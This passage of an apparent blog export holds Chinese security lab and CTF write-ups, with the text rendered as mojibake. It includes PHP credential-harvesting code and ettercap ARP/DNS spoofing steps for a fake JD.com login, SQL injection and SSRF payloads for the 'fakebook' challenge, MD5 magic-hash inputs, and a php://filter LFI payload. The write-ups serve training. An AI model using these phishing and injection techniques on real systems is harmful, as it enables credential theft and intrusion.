@fwrite($filed, <span class="hljs-string">"$content\n"</span>);     <span class="hljs-comment">//å°†ç”¨æˆ·åå’Œå¯†ç å†™å…¥1.txt</span>
<span class="hljs-meta">?&gt;</span>
&lt;html&gt;
&lt;head&gt;
&lt;script type=<span class="hljs-string">"text/javascript"</span>&gt;
		<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">goBack</span><span class="hljs-params">()</span></span>
<span class="hljs-function">		</span>&#123;
			window.history.back() <span class="hljs-comment">//åé€€+åˆ·æ–°</span>
		&#125;
&lt;/script&gt;
&lt;/head&gt;
&lt;body onload=<span class="hljs-string">"goBack()"</span>&gt; &lt;!-- åŠ è½½ä¹‹åç«‹å³æ‰§è¡Œä¸€æ®µ JavaScript --&gt;
&lt;/body&gt;
&lt;/html&gt;</code></pre></div>
<p>4.å®éªŒæ‹“æ‰‘å›¾<br><img src="/2020/07/18/diaoyu/tuopu.png" srcset="/img/loading.gif" alt></p>
<h2 id="å®éªŒæ­¥éª¤"><a href="#å®éªŒæ­¥éª¤" class="headerlink" title="å®éªŒæ­¥éª¤"></a>å®éªŒæ­¥éª¤</h2><h3 id="ä¸€-éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨"><a href="#ä¸€-éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨" class="headerlink" title="ä¸€.éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨"></a>ä¸€.éƒ¨ç½²äº¬ä¸œçš„æœåŠ¡å™¨</h3><p>1.å®‰è£…DNSå’ŒwebæœåŠ¡å™¨ï¼ˆå…·ä½“æ­¥éª¤ç•¥ï¼‰<br>2.é…ç½®DNSæœåŠ¡å™¨<br>a.åœ¨æ­£å‘è§£æä¸­å»ºä¸€ä¸ªåŒºåŸŸåå­—ä¸ºjd ipä¸ºæœåŠ¡å™¨åœ°å€ï¼ˆ10.1.1.1ï¼‰<br>b.åœ¨jdåŸŸä¸­æ–°å»ºä¸€å°ä¸»æœº  <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>    ip:10.1.1.1</p>
<p>2.IIS<br>a.å°†é»˜è®¤ç½‘ç«™åœæ­¢<br>b.æ–°å»ºç½‘ç«™jd.com,æ–‡ä»¶è·¯å¾„ä¸ºä¿å­˜çš„jdç½‘é¡µ<br>c.æ‰“å¼€webæœåŠ¡ä¸­çš„aspï¼ˆå› ä¸ºæ­¤ç½‘ç«™ä¸æ˜¯é™æ€ç½‘ç«™ï¼‰<br><img src="/2020/07/18/diaoyu/1.png" srcset="/img/loading.gif" alt><br>ï¼ˆä½¿ç”¨2003å®¢æˆ·æœºè®¿é—®<a href="http://www.jd.comçœ‹çœ‹ç½‘ç«™å‘å¸ƒæ˜¯å¦æˆåŠŸï¼‰" target="_blank" rel="noopener">www.jd.comçœ‹çœ‹ç½‘ç«™å‘å¸ƒæ˜¯å¦æˆåŠŸï¼‰</a></p>
<h3 id="äºŒ-éƒ¨ç½²kali"><a href="#äºŒ-éƒ¨ç½²kali" class="headerlink" title="äºŒ.éƒ¨ç½²kali"></a>äºŒ.éƒ¨ç½²kali</h3><p>1.å°†é’“é±¼ç½‘é¡µçš„æ‰€æœ‰æ–‡ä»¶æ”¾åˆ° kali çš„/var/www/html/è·¯å¾„ä¸‹ï¼Œ å¹¶ä¿®æ”¹ 1.txt çš„æƒé™ï¼Œ ä½¿è¿™ä¸ªæ–‡æ¡£å¯ä»¥å†™å…¥æ•°æ®ã€‚<br><img src="/2020/07/18/diaoyu/2.png" srcset="/img/loading.gif" alt><br>2.å¼€å¯apacheæœåŠ¡ï¼Œå¹¶æ£€æŸ¥80ç«¯å£æ˜¯å¦å·²å¼€å¯<br><code>systemctl start apache2</code><br><code>netstat -antpl</code><br><img src="/2020/07/18/diaoyu/3.png" srcset="/img/loading.gif" alt><br>3.ä¿®æ”¹DNSæ¬ºéª—é…ç½®æ–‡ä»¶ï¼Œä½¿ç”¨ vim ç¼–è¾‘å™¨ï¼Œ å‘½ä»¤ï¼švim /etc/ettercap/etter.dnsï¼Œç„¶å æ·»åŠ ä¸€æ¡ A è®°å½•ï¼Œ<br>æ·»åŠ ä¸€æ¡ PTR è®°å½•ï¼Œä½¿ç”¨æˆ·è®¿é—®ä»»ä½•ç½‘é¡µï¼Œå…¨éƒ¨æŒ‡å‘ä¸º10.1.1.2<br>  <img src="/2020/07/18/diaoyu/4.png" srcset="/img/loading.gif" alt><br><code>é€‰ä¸­ä¸€è¡Œåï¼ŒæŒ‰ä¸¤æ¬¡då¯åˆ é™¤å†…å®¹</code><br><code>æƒ³è¦ç¼–è¾‘æ—¶ï¼Œå…ˆæŒ‰i(insert)</code><br><code>ç¼–è¾‘ç»“æŸå  :wq ä¿å­˜</code><br>4.æ‰“å¼€ettercapè½¯ä»¶<br>5.é€‰æ‹©sniffâ€“unified sniffingï¼Œå¹¶é€‰æ‹©ç›‘å¬eth0<br>6.ç„¶åé€‰æ‹©Hostsâ€”â€”Scan for hostsâ€“æ‰«æå®Œæˆåé€‰æ‹©Hostsâ€”â€”Hosts list,å¯ä»¥çœ‹åˆ°æ‰«æåˆ°çš„ä¸»æœº<br>7.æ·»åŠ æ¬ºéª—è®°å½•<br>é€‰ä¸­10.1.1.1ï¼Œç‚¹å‡»Add to Target 1 é€‰ä¸­10.1.1.3ï¼Œç‚¹å‡»Add to Target 2<br>8.åœ¨Mitmé€‰æ‹©ARPæ¬ºéª—<br><img src="/2020/07/18/diaoyu/5.png" srcset="/img/loading.gif" alt><br>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œå‹¾é€‰ç¬¬ä¸€ä¸ªç‚¹å‡»ç¡®å®š<br><img src="/2020/07/18/diaoyu/6.png" srcset="/img/loading.gif" alt><br>9.é€‰æ‹©plugins â€“ Manage the pluginsï¼Œå‡†å¤‡è¿›è¡ŒDNSæ¬ºéª—<br>åœ¨å¼¹å‡ºçš„çª—å£ä¸­ï¼Œ æ‰¾åˆ° dns spoof å¹¶åŒå‡»å‡ºç°*å·ï¼Œå¼€å§‹DNSæ¬ºéª—</p>
<h3 id="ä¸‰-ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢"><a href="#ä¸‰-ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢" class="headerlink" title="ä¸‰.ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢"></a>ä¸‰.ç”¨æˆ·è®¿é—®ç™»å½•é¡µé¢</h3><p>1.åœ¨å®¢æˆ·æœºä¸­åœ¨ä¸­ï¼Œå†æ¬¡ç™»å½•<a href="http://www.jd.comè¾“å…¥ç”¨æˆ·åå¯†ç ç­‰ï¼Œå¦‚å›¾ï¼Œç„¶åç‚¹å‡»ç™»å½•" target="_blank" rel="noopener">www.jd.comè¾“å…¥ç”¨æˆ·åå¯†ç ç­‰ï¼Œå¦‚å›¾ï¼Œç„¶åç‚¹å‡»ç™»å½•</a><br><img src="/2020/07/18/diaoyu/7.png" srcset="/img/loading.gif" alt><br>2.åœ¨kaliè™šæ‹Ÿæœºä¸­ï¼Œå·²ç»é’“é±¼æˆåŠŸï¼Œå¹¶é’“åˆ°äº¬ä¸œçš„ç™»å½•è´¦æˆ·åŠå¯†ç (cat 1.txt)<br><img src="/2020/07/18/diaoyu/8.png" srcset="/img/loading.gif" alt></p>
]]></content>
      <categories>
        <category>æ¼æ´</category>
      </categories>
      <tags>
        <tag>DNS</tag>
      </tags>
  </entry>
  <entry>
    <title>fakebook</title>
    <url>/2020/09/27/fakebook/</url>
    <content><![CDATA[<h1 id="æ”»é˜²ä¸–ç•Œ-fakebook"><a href="#æ”»é˜²ä¸–ç•Œ-fakebook" class="headerlink" title="æ”»é˜²ä¸–ç•Œ-fakebook"></a>æ”»é˜²ä¸–ç•Œ-fakebook</h1><p>æ„Ÿè§‰æŒºæœ‰æ„æ€çš„ä¸€é“é¢˜ï¼Œæ‰€ä»¥è®°å½•ä¸€ä¸‹å§</p>
<a id="more"></a>

<h2 id="0x01å‘ç°æ³¨å…¥ç‚¹"><a href="#0x01å‘ç°æ³¨å…¥ç‚¹" class="headerlink" title="0x01å‘ç°æ³¨å…¥ç‚¹"></a>0x01å‘ç°æ³¨å…¥ç‚¹</h2><p>è¿›å…¥ç½‘é¡µå‘ç°æ˜¯ä¸€ä¸ªåšå®¢é¡µé¢ï¼Œå…ˆéšä¾¿æ³¨å†Œä¸€ä¸ªè´¦å·ç™»å½•ä¸Šå»çœ‹çœ‹ï¼Œå‘ç°äº†ä¸€ä¸ªè²Œä¼¼å¯ä»¥æ³¨å…¥çš„åœ°æ–¹</p>
<p><code>http://220.249.52.133:44224/view.php?no=1</code>å‚æ•°noè¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªæ•°å­—å‹çš„æ³¨å…¥ç‚¹ï¼Œæµ‹è¯•ä¸€ä¸‹ã€‚</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=1</code>æ˜¾ç¤ºæ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯</p>
<p><code>http://220.249.52.133:44224/view.php?no=1 and 1=2</code>ç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šäº†å°±æ˜¯æ•°å­—å‹æ³¨å…¥</p>
<p>æ¥ä¸‹æ¥ç»§ç»­æ³¨å…¥çš„å¸¸è§„æ“ä½œã€‚</p>
<p><code>http://220.249.52.133:44224/view.php?no=-2 order by 4#</code>æ—¶é¡µé¢æ˜¾ç¤ºæ­£å¸¸ï¼Œå¹¶æç¤ºäº†ç½‘ç«™çš„æ ¹ç›®å½•</p>
<p><img src="/2020/09/27/fakebook/order.png" srcset="/img/loading.gif" alt></p>
<p>ä½†æ˜¯å½“ order by 5 # æ—¶ï¼Œç½‘é¡µæŠ¥é”™ï¼Œç¡®å®šæ˜¯å››åˆ—ã€‚</p>
<p><strong>çˆ†è¡¨å</strong></p>
<p>æœ¬ä»¥ä¸ºä¼šé¡ºåˆ©çš„çˆ†ç ´å‡ºæ¥ï¼Œä½†æ˜¯æç¤ºäº† hacker ï¼Œè¿™é‡Œå¯èƒ½å­˜åœ¨é»‘åå•æ£€æµ‹</p>
<p><img src="/2020/09/27/fakebook/waf.png" srcset="/img/loading.gif" alt="waf"></p>
<p>è¯•äº†è¯•åŒå†™ç»•è¿‡ï¼Œå‘ç°ç»§ç»­æç¤ºhackï¼Œå†è¯•è¯•ç”¨/**/æ›¿æ¢ç©ºæ ¼ï¼Œè¿™æ¬¡å±…ç„¶å¯ä»¥äº†ï¼Œæš‚ä¸”å½“å®ƒæ˜¯ç¦äº†ç©ºæ ¼ã€‚è¿™é‡Œè¿˜å‡ºç°ä¸€ä¸ªæç¤º</p>
<p><strong>Notice: unserialize(): Error at offset 0 of 1 bytes in /var/www/html/view.php on line 31</strong> æç¤ºå­˜åœ¨ååºåˆ—åŒ–ï¼Œä½†æ˜¯ä¸çŸ¥é“æ€ä¹ˆç”¨ç»§ç»­çˆ†è¡¨ã€‚</p>
<p><img src="/2020/09/27/fakebook/%E5%9B%9E%E6%98%BE.png" srcset="/img/loading.gif" alt></p>
<p><code>?no=-2/**/union/**/select/**/1,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database()),3,4#</code></p>
<p><code>?no=-2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name=&#39;users&#39;#</code></p>
<p>çˆ†å‡ºä¸€å¤§å †åˆ—åã€‚ç›´æ¥è¯»å–dataçš„å†…å®¹</p>
<p><strong>no,username,passwd,data,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS</strong></p>
<p><code>?no=-2 union/**/select 1,(select data from users),3,4 #</code></p>
<p>å‘ç°å†…å®¹æ˜¯æ³¨å†Œæ—¶ä¿¡æ¯ä¿å­˜ä¸ºåºåˆ—åŒ–å†…å®¹</p>
<p>O:8:â€UserInfoâ€:3:{s:4:â€nameâ€;s:5:â€sunzyâ€;s:3:â€ageâ€;i:22;s:4:â€blogâ€;s:12:â€22.github.ioâ€;}</p>
<p>åˆ°è¿™é‡Œå°±ä¸çŸ¥é“æ€ä¹ˆåŠäº†ã€‚ã€‚ã€‚</p>
<h2 id="0x02å®¡è®¡æºç "><a href="#0x02å®¡è®¡æºç " class="headerlink" title="0x02å®¡è®¡æºç "></a>0x02å®¡è®¡æºç </h2><p>æ‰«æä¸€ä¸‹ç›®å½•å‘ç°äº†robots.txtï¼Œå…¶ä¸­ç»™å‡ºæ¥äº†æºç å¤‡ä»½æ–‡ä»¶çš„è·¯å¾„</p>
<p><img src="/2020/09/27/fakebook/robots.png" srcset="/img/loading.gif" alt></p>
<p>æºç </p>
<div class="hljs"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserInfo</span>   //<span class="hljs-title">user</span>ä¿¡æ¯ç±»</span>
<span class="hljs-class"></span>&#123;
    <span class="hljs-keyword">public</span> $name = <span class="hljs-string">""</span>;
    <span class="hljs-keyword">public</span> $age = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">public</span> $blog = <span class="hljs-string">""</span>;
<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span><span class="hljs-params">($name, $age, $blog)</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">$this</span>-&gt;name = $name;
    <span class="hljs-keyword">$this</span>-&gt;age = (int)$age;
    <span class="hljs-keyword">$this</span>-&gt;blog = $blog;
&#125;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span><span class="hljs-params">($url)</span> // å¤„ç†<span class="hljs-title">url</span></span>
<span class="hljs-function"></span>&#123;
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="hljs-number">1</span>);
    $output = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    <span class="hljs-keyword">if</span>($httpCode == <span class="hljs-number">404</span>) &#123;
        <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>;
    &#125;
    curl_close($ch);

    <span class="hljs-keyword">return</span> $output;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getBlogContents</span> <span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;get(<span class="hljs-keyword">$this</span>-&gt;blog);
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isValidBlog</span> <span class="hljs-params">()</span></span>
<span class="hljs-function"></span>&#123;
    $blog = <span class="hljs-keyword">$this</span>-&gt;blog;
    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i"</span>, $blog);
&#125;
&#125;</code></pre></div>
<p>å®¡è®¡æºç å‘ç°å…¶ä¸­get()å‡½æ•°å­˜åœ¨SSRF(æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ )æ¼æ´ã€‚</p>
<p><strong>æ€è·¯ï¼šåˆ©ç”¨noå‚æ•°è¿›è¡Œæ³¨å…¥ï¼Œåœ¨ååºåˆ—åŒ–ä¸­æ„é€ fileæ–‡ä»¶åè®®ï¼Œåˆ©ç”¨æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ¼æ´è®¿é—®æœåŠ¡å™¨ä¸Šçš„flag.phpæ–‡ä»¶ã€‚</strong></p>
<div class="hljs"><pre><code class="hljs groovy">?no=-2%20union/**/select%201,2,3,'O:<span class="hljs-number">8</span>:<span class="hljs-string">"UserInfo"</span>:<span class="hljs-number">3</span>:&#123;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;<span class="hljs-string">s:</span><span class="hljs-number">5</span>:<span class="hljs-string">"sunzy"</span>;<span class="hljs-string">s:</span><span class="hljs-number">3</span>:<span class="hljs-string">"age"</span>;<span class="hljs-string">i:</span><span class="hljs-number">22</span>;<span class="hljs-string">s:</span><span class="hljs-number">4</span>:<span class="hljs-string">"blog"</span>;<span class="hljs-string">s:</span><span class="hljs-number">29</span>:<span class="hljs-string">"file:///var/www/html/flag.php"</span>;&#125;<span class="hljs-string">'%20#</span></code></pre></div>

<p>æŸ¥çœ‹æºç ï¼Œè§£base64ã€‚</p>
]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>sql</tag>
        <tag>unserailize</tag>
      </tags>
  </entry>
  <entry>
    <title>jdtest</title>
    <url>/2020/07/18/jdtest/</url>
    <content><![CDATA[<h1 id="çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•"><a href="#çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•" class="headerlink" title="çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•"></a>çˆ¬å–äº¬ä¸œå•†å“å›¾ç‰‡çš„å°æµ‹è¯•</h1><a id="more"></a>
<p>è®¿é—®çš„é¡µé¢<br><img src="/2020/07/18/jdtest/jd.png" srcset="/img/loading.gif" alt="1"><br>å›¾ç‰‡é“¾æ¥çš„ä½ç½®<br><img src="/2020/07/18/jdtest/link.png" srcset="/img/loading.gif" alt="2"></p>
<div class="hljs"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding = utf - 8 -*-</span>
<span class="hljs-comment">#@Time : 2020/7/16 14:54</span>
<span class="hljs-comment">#@Author : sunzy</span>
<span class="hljs-comment">#@File : jd.py</span>

<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> time
<span class="hljs-keyword">import</span> os

dir = <span class="hljs-string">"jdtp"</span>
<span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dir):
    os.mkdir(dir)

baseurl = <span class="hljs-string">"https://search.jd.com/Search?keyword=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;enc=utf-8&amp;wq=%E8%BF%9B%E5%8F%A3%E9%9B%B6%E9%A3%9F&amp;pvid=ryxp9pui.nhltvu"</span>

head = &#123;
        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36 Edg/83.0.478.61"</span>
    &#125;
response = requests.get(url=baseurl, headers = head)
<span class="hljs-comment">#print(response.text)</span>
html = response.text

findlinks = <span class="hljs-string">'&lt;img width="220" height="220" data-img="\d" src="(.*?)".*?&gt;'</span>
<span class="hljs-comment">#&lt;img width="220" height="220" data-img="1" src="//img10.360buyimg.com/n7/jfs/t22093/305/286523587/498951/2ddddbdf/5b30b30dNd6c7eca0.jpg" data-lazy-img="done" source-data-lazy-img=""&gt;</span>
urls = re.findall(findlinks, html)

<span class="hljs-keyword">for</span> url <span class="hljs-keyword">in</span> urls:
    time.sleep(<span class="hljs-number">1</span>)
    file_name = url.split(<span class="hljs-string">'/'</span>)[<span class="hljs-number">-1</span>]
    res = requests.get(<span class="hljs-string">"http:"</span>+url,headers = head)
    <span class="hljs-keyword">with</span> open(dir+<span class="hljs-string">'/'</span>+file_name, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:
        f.write(res.content)</code></pre></div>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>nctf</title>
    <url>/2020/08/29/nctf/</url>
    <content><![CDATA[<h1 id="nctf-1"><a href="#nctf-1" class="headerlink" title="nctf-1"></a>nctf-1</h1><a id="more"></a>

<h2 id="ç­¾åˆ°é¢˜"><a href="#ç­¾åˆ°é¢˜" class="headerlink" title="ç­¾åˆ°é¢˜"></a>ç­¾åˆ°é¢˜</h2><p>æŸ¥çœ‹æºç å³å¯çœ‹åˆ°flag</p>
<h2 id="md5-collision"><a href="#md5-collision" class="headerlink" title="md5 collision"></a>md5 collision</h2><p>ä¸€é“ç®€å•çš„md5æ¼æ´é¢˜ç›®</p>
<p><strong>md5å‡½æ•°æ¼æ´</strong></p>
<p>æºç </p>
<div class="hljs"><pre><code class="hljs php">$md51 = md5(<span class="hljs-string">'QNKCDZO'</span>);
$a = @$_GET[<span class="hljs-string">'a'</span>];
$md52 = @md5($a);
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($a))&#123;
<span class="hljs-keyword">if</span> ($a != <span class="hljs-string">'QNKCDZO'</span> &amp;&amp; $md51 == $md52) &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"nctf&#123;*****************&#125;"</span>;
&#125; <span class="hljs-keyword">else</span> &#123;
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"false!!!"</span>;
&#125;&#125;
<span class="hljs-keyword">else</span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">"please input a"</span>;&#125;</code></pre></div>

<p>å³ä½¿ç”¨getæ–¹å¼ä¼ é€’ä¸€ä¸ªå‚æ•°a,ä½¿å¾—açš„å€¼ä¸ç­‰äº<code>QNKCDZO</code>ä½†æ˜¯äºŒè€…çš„md5å€¼ç›¸åŒ</p>
<p>PHPåœ¨å¤„ç†å“ˆå¸Œå­—ç¬¦ä¸²æ—¶ï¼Œä¼šåˆ©ç”¨â€!=â€æˆ–â€==â€æ¥å¯¹å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒï¼Œå®ƒæŠŠæ¯ä¸€ä¸ªä»¥â€0Eâ€å¼€å¤´çš„å“ˆå¸Œå€¼éƒ½è§£é‡Šä¸º0ï¼Œæ‰€ä»¥å¦‚æœä¸¤ä¸ªä¸åŒçš„å¯†ç ç»è¿‡å“ˆå¸Œä»¥åï¼Œå…¶å“ˆå¸Œå€¼éƒ½æ˜¯ä»¥â€0Eâ€å¼€å¤´çš„ï¼Œé‚£ä¹ˆPHPå°†ä¼šè®¤ä¸ºä»–ä»¬ç›¸åŒï¼Œéƒ½æ˜¯0ã€‚</p>
<p>å¸¸è§çš„payloadæœ‰</p>
<div class="hljs"><pre><code class="hljs c++">QNKCDZO
<span class="hljs-number">240610708</span>
s878926199a
s155964671a
s214587387a
s214587387a
 sha1(str)
sha1('aaroZmOk')  
sha1('aaK1STfY')
sha1('aaO8zKZF')
sha1('aa3OFF9m')</code></pre></div>

<h2 id="ç­¾åˆ°2"><a href="#ç­¾åˆ°2" class="headerlink" title="ç­¾åˆ°2"></a>ç­¾åˆ°2</h2><p>æç¤ºè¾“å…¥å£ä»¤ï¼Œå°è¯•è¾“å…¥å‘ç°åªèƒ½è¾“å…¥åä¸ªå­—æ¯ï¼Œä½†æ˜¯å£ä»¤æœ‰11ä¸ªå­—æ¯</p>
<p>F12å®¡æŸ¥å…ƒç´ ï¼Œä¿®æ”¹è¾“å…¥æ¡†çš„<code>maxlength</code>å€¼ï¼Œå¤§äº11å³å¯</p>
<p><img src="/2020/08/29/nctf/qd1.png" srcset="/img/loading.gif" alt></p>
<p>å†æ¬¡è¾“å…¥å£ä»¤å³å¯ã€‚</p>
<p>è€ƒç‚¹ä¸ºå‰ç«¯ä»£ç ä¿®æ”¹</p>
<h2 id="è¿™é¢˜ä¸æ˜¯WEB"><a href="#è¿™é¢˜ä¸æ˜¯WEB" class="headerlink" title="è¿™é¢˜ä¸æ˜¯WEB"></a>è¿™é¢˜ä¸æ˜¯WEB</h2><p>è¿™é“é¢˜è¿˜çœŸä¸æ˜¯web</p>
<p>è¿›å…¥é¢˜ç›®é“¾æ¥ï¼Œå‘ç°ä¸€å¼ åŠ¨å›¾ï¼Œæœ¬èƒ½çš„å°†å…¶æ‹–å…¥åŠ¨å›¾æŸ¥çœ‹å™¨ç§ï¼Œç»“æœä»€ä¹ˆéƒ½æ²¡å‘ç°ï¼Œäºæ˜¯æ‰“å¼€winhex</p>
<p><img src="/2020/08/29/nctf/%E8%BF%99%E4%B8%8D%E6%98%AFweb.png" srcset="/img/loading.gif" alt></p>
<h2 id="å±‚å±‚é€’è¿›"><a href="#å±‚å±‚é€’è¿›" class="headerlink" title="å±‚å±‚é€’è¿›"></a>å±‚å±‚é€’è¿›</h2><p> é¢˜ç›®ä¸ºå±‚å±‚é€’è¿›ï¼Œé€šè¿‡<strong>F12</strong>ä¸­<strong>Sources</strong>åŠŸèƒ½ï¼ŒæŸ¥çœ‹ç½‘ç«™çš„åŒ…å«æƒ…å†µï¼Œå‘ç°åˆ°å¯ç–‘åœ°å€ï¼š<code>SO.html</code>ï¼ŒæŸ¥çœ‹å‘ç°ç›¸ä¼¼å¯ä»¥åœ°å€ï¼Œæœ€ååœ¨<code>404.html</code>æºç ä¸­å¾—åˆ°<strong>flag</strong>ï¼ˆç«–æ’æ’å…¥åœ¨æ ‡ç­¾ä¸­ï¼‰ï¼š </p>
<p><img src="/2020/08/29/nctf/%E5%B1%82%E5%B1%82%E9%80%92%E8%BF%9B.png" srcset="/img/loading.gif" alt></p>
<h2 id="å•èº«äºŒåå¹´"><a href="#å•èº«äºŒåå¹´" class="headerlink" title="å•èº«äºŒåå¹´"></a>å•èº«äºŒåå¹´</h2><p><strong>tip:åœ¨è¿™é‡Œæ‰¾key</strong></p>
<p>ç‚¹å‡»å‘ç°urlæ”¹å˜ï¼Œè·³è½¬åˆ°äº†å¦ä¸€ä¸ªé¡µé¢</p>
<p>bpæŠ“åŒ…è¯•è¯•ï¼Œgoä¸€ä¸‹ï¼Œç›¸åº”åŒ…ä¸­å‡ºç°flag</p>
<p><img src="/2020/08/29/nctf/ds1.png" srcset="/img/loading.gif" alt></p>
<h2 id="phpencode"><a href="#phpencode" class="headerlink" title="phpencode"></a>phpencode</h2><p>ä¸€å¼€å§‹ä»¥ä¸ºæ˜¯è§£ç ï¼Œç»“æœå‘ç°ä»£ç é€»è¾‘ä¸å¯¹ï¼Œç›´æ¥è¿è¡Œphpä»£ç ï¼Œå‡ºé”™</p>
<p>å°†æœ€åçš„<code>eval</code>æ”¹ä¸º<code>echo</code>,æäº¤è¿è¡Œå³å¯</p>
<p><img src="/2020/08/29/nctf/echo.png" srcset="/img/loading.gif" alt></p>
<p><img src="/2020/08/29/nctf/phpencode.png" srcset="/img/loading.gif" alt></p>
<h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><p> <strong>é»‘ç›’åˆ¤æ–­æ–¹æ³•ï¼š<br>å•çº¯çš„ä»URLåˆ¤æ–­çš„è¯ï¼ŒURLä¸­pathã€dirã€fileã€pagã€pageã€archiveã€pã€engã€è¯­è¨€æ–‡ä»¶ç­‰ç›¸å…³å…³é”®å­—çœ¼çš„æ—¶å€™,å¯èƒ½å­˜åœ¨æ–‡ä»¶åŒ…å«æ¼æ´ã€‚</strong> </p>
<p> æ ¹æ®<strong>PHPä¼ªåè®®</strong>å°è¯•æ„é€ å¦‚ä¸‹<strong>Payloadï¼š</strong><code>?file=php://filter/read=convert.base64-encode/resource=index.php</code>ï¼Œå°†<strong>index.php</strong>çš„æºç ç»è¿‡<strong>Base64ç¼–ç </strong>è¾“å‡º </p>
<p><code>PGh0bWw+CiAgICA8dGl0bGU+YXNkZjwvdGl0bGU+CiAgICAKPD9waHAKCWVycm9yX3JlcG9ydGluZygwKTsKCWlmKCEkX0dFVFtmaWxlXSl7ZWNobyAnPGEgaHJlZj0iLi9pbmRleC5waHA/ZmlsZT1zaG93LnBocCI+Y2xpY2sgbWU/IG5vPC9hPic7fQoJJGZpbGU9JF9HRVRbJ2ZpbGUnXTsKCWlmKHN0cnN0cigkZmlsZSwiLi4vIil8fHN0cmlzdHIoJGZpbGUsICJ0cCIpfHxzdHJpc3RyKCRmaWxlLCJpbnB1dCIpfHxzdHJpc3RyKCRmaWxlLCJkYXRhIikpewoJCWVjaG8gIk9oIG5vISI7CgkJZXhpdCgpOwoJfQoJaW5jbHVkZSgkZmlsZSk7IAovL2ZsYWc6bmN0ZntlZHVsY25pX2VsaWZfbGFjb2xfc2lfc2lodH0KCj8+CjwvaHRtbD4=</code></p>
<p>base64è§£ç </p>
<div class="hljs"><pre><code class="hljs php+HTML">&lt;html&gt;
    &lt;title&gt;asdf&lt;&#x2F;title&gt;
&lt;?php
	error_reporting(0);
	if(!$_GET[file])&#123;echo &#39;&lt;a href&#x3D;&quot;.&#x2F;index.php?file&#x3D;show.php&quot;&gt;click me? no&lt;&#x2F;a&gt;&#39;;&#125;
	$file&#x3D;$_GET[&#39;file&#39;];
	if(strstr($file,&quot;..&#x2F;&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;
		echo &quot;Oh no!&quot;;
		exit();
	&#125;
	include($file); 
&#x2F;&#x2F;flag:nctf&#123;edulcni_elif_lacol_si_siht&#125;
?&gt;
&lt;&#x2F;html&gt;</code></pre></div>

<h2 id="å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨"><a href="#å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨" class="headerlink" title="å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨"></a>å•èº«ä¸€ç™¾å¹´ä¹Ÿæ²¡ç”¨</h2><p>ä¸å•èº«äºŒåå¹´ä¸€æ ·ï¼ŒæŠ“åŒ…å³å¯</p>
<p><img src="/2020/08/29/nctf/ds2.png" srcset="/img/loading.gif" alt></p>
